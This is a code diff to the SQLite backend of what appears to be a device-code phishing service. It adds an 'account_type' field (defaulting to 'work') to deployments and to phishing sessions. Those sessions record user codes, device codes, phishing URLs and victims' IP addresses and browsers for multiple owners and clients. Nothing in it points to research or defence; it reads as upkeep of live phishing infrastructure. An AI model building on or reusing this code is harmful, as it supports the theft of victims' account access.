@@ -138,6 +138,13 @@ def init_db():
     try:
         cursor.execute("ALTER TABLE owned_domains ADD COLUMN pending_client_id INTEGER")
     except sqlite3.OperationalError: pass
+    try:
+        cursor.execute("ALTER TABLE deployments ADD COLUMN account_type TEXT DEFAULT 'work'")
+    except sqlite3.OperationalError: pass
+    try:
+        cursor.execute("ALTER TABLE sessions ADD COLUMN account_type TEXT DEFAULT 'work'")
+    except sqlite3.OperationalError: pass
+    except sqlite3.OperationalError: pass
     # Legacy adoption: domains previously assigned via client_domain_assignments
     # become the client's property and leave the master pool entirely.
     try:
@@ -481,12 +488,12 @@ def init_db():
     conn.close()
 
 
-def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A", owner_id=None, deployment_id=None):
+def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A", owner_id=None, deployment_id=None, account_type='work'):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     try:
-        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status, owner_id, deployment_id)
-            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?, ?)''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent, owner_id, deployment_id))
+        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status, owner_id, deployment_id, account_type)
+            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?, ?, ?)''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent, owner_id, deployment_id, account_type))
         conn.commit()
         return cursor.lastrowid
     except sqlite3.IntegrityError: return None
